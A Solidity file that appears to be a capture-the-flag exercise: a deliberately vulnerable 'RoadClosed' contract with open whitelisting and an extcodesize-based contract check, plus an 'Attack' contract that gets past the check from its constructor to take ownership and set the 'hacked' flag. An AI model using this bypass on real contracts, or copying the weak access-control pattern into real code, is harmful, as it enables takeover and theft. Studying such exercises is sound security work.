pragma solidity 0.8.7;
import "hardhat/console.sol";
contract RoadClosed {

    bool hacked;
    address owner;
	address pwner;
    mapping(address => bool) public  whitelistedMinters;


    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
            }
        return size > 0;
    }

    function isOwner() public view returns(bool){
        if (msg.sender==owner) {
            return true;
        }
        else return false;
    }

    constructor() {
        owner = msg.sender;
    }

    function addToWhitelist(address addr) public {
        console.log("addToWhitelist",addr);
        require(!isContract(addr),"Contracts are not allowed");
        whitelistedMinters[addr] = true;
    }
    

    function changeOwner(address addr) public {
        require(whitelistedMinters[addr], "You are not whitelisted");
		require(msg.sender == addr, "address must be msg.sender");
        require(addr != address(0), "Zero address");
        owner = addr;
    }

    function pwn(address addr) external payable{
        require(!isContract(msg.sender), "Contracts are not allowed");
		require(msg.sender == addr, "address must be msg.sender");
        require (msg.sender == owner, "Must be owner");
        hacked = true;
    }

    function pwn() external payable {
        require(msg.sender == pwner);
        hacked = true;
    }

    function isHacked() public view returns(bool) {
        return hacked;
    }
}

contract Attack {
    RoadClosed target;
    constructor(RoadClosed _t) {
        target = _t;
        _constructorAttack();
    }
    function _constructorAttack() internal {
        bool result =target.isContract(address(this));
        target.addToWhitelist(address(this));
        target.changeOwner(address(this));
        target.pwn(address(this));
        console.log(result);
    }
}